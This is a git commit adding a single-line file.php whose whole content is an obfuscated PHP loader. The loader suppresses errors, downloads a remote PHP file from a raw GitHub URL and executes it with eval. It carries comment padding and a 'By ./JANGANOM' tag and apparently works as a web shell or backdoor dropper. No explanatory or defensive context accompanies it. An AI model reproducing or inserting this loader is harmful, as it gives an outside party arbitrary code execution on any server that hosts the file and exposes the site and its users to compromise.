fc632a21e06e3b9c350db484586a5465196dcc02
maut12wqwq <csjerryrajabandot@gmail.com>
2024-10-23 12:06:25 +0700

    Create file.php

---
+++ file.php
@@ -0,0 +1,1 @@
+<?=/****/@/*77777*/null; /******/@/*77777*/error_reporting(0);/****/@/*77777*/null; /******/@/*77777*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/maut12wqwq/bandot/refs/heads/main/file0.php"))/******/ /*By ./JANGANOM*/?>
